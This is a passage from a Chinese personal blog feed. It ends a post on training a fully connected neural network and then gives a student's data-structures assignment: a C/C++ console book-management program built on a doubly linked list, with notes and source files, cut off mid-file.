collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowCostFig</span>(<span class="params">epoch, cost</span>):</span></span><br><span class="line">    <span class="comment"># 绘制损失函数在迭代中的变化图像</span></span><br><span class="line">    ax = plt.figure().gca()</span><br><span class="line">    ax.xaxis.set_major_locator(MaxNLocator(integer=<span class="literal">True</span>))  <span class="comment"># 使坐标刻度为整数</span></span><br><span class="line">    plt.plot(<span class="built_in">range</span>(<span class="number">0</span>, epoch), cost[<span class="number">0</span>:], <span class="string">&quot;go-&quot;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    print(<span class="string">&quot;Final Cost: &quot;</span> + <span class="built_in">str</span>(cost[epoch - <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowdwFig</span>(<span class="params">epoch, dw, layerNum</span>):</span></span><br><span class="line">    <span class="comment"># 绘制dw的L2在迭代中的变化图像</span></span><br><span class="line">    camp = getCmap(layerNum)</span><br><span class="line">    ax = plt.figure(figsize=(<span class="number">15</span>, <span class="number">5</span>)).gca()</span><br><span class="line">    ax.xaxis.set_major_locator(MaxNLocator(integer=<span class="literal">True</span>))</span><br><span class="line">    <span class="keyword">for</span> i, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(np.transpose(dw)):</span><br><span class="line">        plt.plot(data[<span class="number">1</span>:], c=camp(i), label=i)</span><br><span class="line">    plt.legend()  <span class="comment"># 加上图例</span></span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCmap</span>(<span class="params">n, name=<span class="string">&quot;hsv&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># 从网上copy了一个调色盘来选颜色</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a function that maps each index in 0, 1, ..., n-1 to a distinct</span></span><br><span class="line"><span class="string">    RGB color; the keyword argument name must be a standard mpl colormap name.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> plt.cm.get_cmap(name, n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowNorm</span>(<span class="params">x</span>):</span></span><br><span class="line">    print(<span class="string">&quot;Norm: &quot;</span> + <span class="built_in">str</span>(np.linalg.norm(x)))</span><br></pre></td></tr></table></figure>    </div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FCNN.predict(trainX, trainy)</span><br><span class="line">&gt;&gt; correct: <span class="number">0.9768571428571429</span></span><br><span class="line">FCNN.predict(testX, testy)</span><br><span class="line">&gt;&gt; correct: <span class="number">0.9675</span></span><br><span class="line">ShowNorm(FCNN.w[-<span class="number">1</span>])</span><br><span class="line">&gt;&gt; Norm: <span class="number">4.553835257428929</span></span><br><span class="line">ShowCostFig(epoch, FCNN.cost)</span><br><span class="line">&gt;&gt; Final Cost: <span class="number">0.2906157343621473</span></span><br><span class="line">ShowdwFig(epoch, FCNN.dwNorm, FCNN.layerNum)</span><br></pre></td></tr></table></figure><img src="/images/FCNN_costFig.png"/><img src="/images/FCNN_dwFig.png"/><p>可见<code>loss</code>的确在以肉眼可见速度收敛，且模型对训练集和测试集的预测准确度相差不大，都保持在96%~97%，对我来说我已经满意了</p><p>最后当然是喜闻乐见的错误样本抽样（只能说相当一部分的错误样本也都不是什么善茬</p><img src="/images/FCNN_wrong.png"/><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构大作业</title>
      <link href="2022/01/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E4%BD%9C%E4%B8%9A/"/>
      <url>2022/01/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E4%BD%9C%E4%B8%9A/</url>
      
        <content type="html"><![CDATA[<p>一早上就能写完，有需要的自己拿去改，不要完全搬就行</p><span id="more"></span><!--toc--><h1 id="数据结构大作业"><a href="#数据结构大作业" class="headerlink" title="数据结构大作业"></a>数据结构大作业</h1><p>一开始准备去网上随便找一个交差的，就，复制下来，然后改改，然后发现能看的也就那几个，代码太多，等我改完了自己都写完了，于是就自己写了</p><p>然后写的时候一开始准备C语言的，但是后面发现要用一些C++的特性，比如这老师要求从文件输入和输出，C++的重定向就很方便，还有比如<code>setw()</code>对排版比较友好</p><p>Since I discovered the new world of AI and cellular automata, I’m not gonna waste much time on this garbage, and I’ll focus on deep learning after this in preparation for exploring the new world</p><h2 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h2><ul><li><p>控制台程序</p></li><li><p>链表储存的数据</p></li><li><p>从文件输入与输出</p><ul><li><p>当目录中存在input.txt的时候，从input.txt中读取输入，并把输出存入output.txt</p></li><li><p>不存在时则是常规的键盘输入</p></li></ul></li><li><p>可读写的硬盘数据存储</p><ul><li>大概就是能够在打开的时候加载data.txt里面的数据到内存</li><li>然后退出的时候能够把内存里的数据存回到data.txt</li></ul></li></ul><p>大概有这些功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">* Input From User</span><br><span class="line">* &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">* 1. Add New Book</span><br><span class="line">* 2. Edit Info</span><br><span class="line">* 3. Delete Book</span><br><span class="line">* 4. Search Book</span><br><span class="line">* 5. View All Books</span><br><span class="line">* 6. Save Data</span><br><span class="line">* 7. Save And Exit</span><br><span class="line">* &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&gt;&gt; Select a function : </span><br></pre></td></tr></table></figure><h2 id="Fun-Stuff"><a href="#Fun-Stuff" class="headerlink" title="Fun Stuff"></a>Fun Stuff</h2><p>虽然这东西是很简单，但是我还是稍微把里面一些奇怪的，在忘了的情况下要花费一点时间理解的东西记录一下（这一点真的很重要，我现在回去看我之前做的逻辑回归的代码表示已经忘干净了正在重新学）</p><h3 id="链表结构"><a href="#链表结构" class="headerlink" title="链表结构"></a>链表结构</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> amount, nameLen, authorLen;</span><br><span class="line">    <span class="keyword">float</span> price;</span><br><span class="line">    <span class="keyword">char</span> *name, *author;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">last</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; * SLNode;</span><br></pre></td></tr></table></figure><p>因为表头一般都是只作为一个头，然后找东西都是从<code>p = head-&gt;next</code>开始找的，但是为了方便，头又和后面的链表是一个结构，如果不把给表头分配的空间利用起来就有点亏，所以我一般喜欢把表长记录在表头，会稍微方便一些，比如此处我就把<code>head-&gt;amount</code>当作是链表的表长来用</p><h3 id="字符串的存储"><a href="#字符串的存储" class="headerlink" title="字符串的存储"></a>字符串的存储</h3><p>在输入字符串的时候一般会预留足够的空间来等待输入（栈溢出？先不考虑，我也不确定<code>cin</code>这种流输入有无溢出的问题）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> input[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">cin</span> &lt;&lt; input;</span><br></pre></td></tr></table></figure><p>等用户输入了字符串的内容，这段内容就应该从栈上转移到堆里，和链表关联起来，这时应该在堆里开储存字符串恰好需要的空间，也就是<code>sizeof(char) * (strLen + 1)</code></p><p>然后就是当链表里有这样额外分配的空间的时候一定要记得在删除node的时候释放掉这些空间，<code>malloc</code>和<code>free</code>一定要平衡</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert</span><span class="params">(SLNode head, ... , <span class="keyword">char</span> *name, <span class="keyword">char</span> *author)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    t-&gt;nameLen = <span class="built_in">strlen</span>(name);</span><br><span class="line">    t-&gt;authorLen = <span class="built_in">strlen</span>(author);</span><br><span class="line">    <span class="keyword">int</span> nameSize = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (t-&gt;nameLen + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> authorSize = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (t-&gt;authorLen + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 此处 字符串长度+1 的原因是结尾的&#x27;\0&#x27;得算进去</span></span><br><span class="line">    t-&gt;name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nameSize);</span><br><span class="line">    t-&gt;author = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(authorSize);</span><br><span class="line">    <span class="built_in">memcpy</span>(t-&gt;name, name, nameSize);</span><br><span class="line">    <span class="built_in">memcpy</span>(t-&gt;author, author, authorSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>和Linux的pipe的概念基本一样？反正要从文件输入输出的话就像下面这样做就好了，ACM人应该挺熟的？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">freopen(<span class="string">&quot;input.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="built_in">stdin</span>);</span><br><span class="line">freopen(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="built_in">stdout</span>);</span><br></pre></td></tr></table></figure><h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        SLNode.h    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> amount, nameLen, authorLen;</span><br><span class="line">    <span class="keyword">float</span> price;</span><br><span class="line">    <span class="keyword">char</span> *name, *author;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">last</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; * SLNode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Initiate</span><span class="params">(SLNode *head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *head = (SLNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">    (*head)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    (*head)-&gt;last = <span class="literal">NULL</span>;</span><br><span class="line">    (*head)-&gt;amount = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">SLNode <span class="title">GetNode</span><span class="params">(SLNode head, <span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt; head-&gt;amount || index &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;# ERROR: Getting index out of range, index = %d &gt; %d\n&quot;</span>, index, head-&gt;amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    SLNode p = head;</span><br><span class="line">    <span class="keyword">while</span> (index-- != <span class="number">0</span>)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert</span><span class="params">(SLNode head, <span class="keyword">int</span> index, <span class="keyword">int</span> amount, <span class="keyword">float</span> price, <span class="keyword">char</span> *name, <span class="keyword">char</span> *author)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt; head-&gt;amount + <span class="number">1</span> || index &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;# ERROR: Inserting index out of range, index = %d\n&quot;</span>, index);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    head-&gt;amount++;</span><br><span class="line">    SLNode t, p;</span><br><span class="line">    t = (SLNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">    p = GetNode(head, index - <span class="number">1</span>);</span><br><span class="line">    t-&gt;next = p-&gt;next;</span><br><span class="line">    t-&gt;last = p;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">        (p-&gt;next)-&gt;last = t;</span><br><span class="line">    p-&gt;next = t;</span><br><span class="line">    t-&gt;amount = amount;</span><br><span class="line">    t-&gt;price = price;</span><br><span class="line">    t-&gt;nameLen = <span class="built_in">strlen</span>(name);</span><br><span class="line">    t-&gt;authorLen = <span class="built_in">strlen</span>(author);</span><br><span class="line">    <span class="keyword">int</span> nameSize = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (t-&gt;nameLen + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> authorSize = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (t-&gt;authorLen + <span class="number">1</span>);</span><br><span class="line">    t-&gt;name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nameSize);</span><br><span class="line">    t-&gt;author = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(authorSize);</span><br><span class="line">    <span class="built_in">memcpy</span>(t-&gt;name, name, nameSize);</span><br><span class="line">    <span class="built_in">memcpy</span>(t-&gt;author, author, authorSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteNode</span><span class="params">(SLNode head, <span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SLNode p = GetNode(head, index);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    head-&gt;amount--;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">        (p-&gt;last)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        (p-&gt;last)-&gt;next = p-&gt;next;</span><br><span class="line">        (p-&gt;next)-&gt;last = p-&gt;last;</span><br><span class="line">        <span class="built_in">free</span>(p-&gt;name);</span><br><span class="line">        <span class="built_in">free</span>(p-&gt;author);</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        LibFunc.h    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;SLNode.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">SLNode head;</span><br><span class="line"><span class="keyword">bool</span> inputFromFile;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AlertWrongInput</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;# ERROR: Wrong input&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintInfoTitle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- | index |  amt  |  price  |&quot;</span> &lt;&lt; setw(<span class="number">17</span>) &lt;&lt; <span class="string">&quot;name&quot;</span> &lt;&lt; setw(<span class="number">13</span>) &lt;&lt; <span class="string">&quot;|&quot;</span> &lt;&lt; setw(<span class="number">18</span>) &lt;&lt; <span class="string">&quot;author&quot;</span> &lt;&lt; setw(<span class="number">12</span>) &lt;&lt; <span class="string">&quot;|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintInfo</span><span class="params">(<span class="keyword">int</span> i, SLNode p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- | &quot;</span> &lt;&lt; setw(<span class="number">5</span>) &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot; | &quot;</span> &lt;&lt; setw(<span class="number">5</span>) &lt;&lt; p-&gt;amount &lt;&lt; <span class="string">&quot; | &quot;</span> &lt;&lt; setw(<span class="number">7</span>) &lt;&lt; p-&gt;price &lt;&lt; <span class="string">&quot; | &quot;</span> &lt;&lt; setw(<span class="number">15</span> + p-&gt;nameLen / <span class="number">2</span>) &lt;&lt; p-&gt;name &lt;&lt; setw(<span class="number">15</span> - p-&gt;nameLen / <span class="number">2</span>) &lt;&lt; <span class="string">&quot; | &quot;</span> &lt;&lt; setw(<span class="number">15</span> + p-&gt;authorLen / <span class="number">2</span>) &lt;&lt; p-&gt;author &lt;&lt; setw(<span class="number">15</span> - p-&gt;authorLen / <span class="number">2</span>) &lt;&lt; <span class="string">&quot; | &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SaveData</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">ofstream <span class="title">f</span><span class="params">(<span class="string">&quot;data.txt&quot;</span>, ios::trunc)</span></span>;</span><br><span class="line">    f &lt;&lt; head-&gt;amount &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    SLNode p = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        f &lt;&lt; 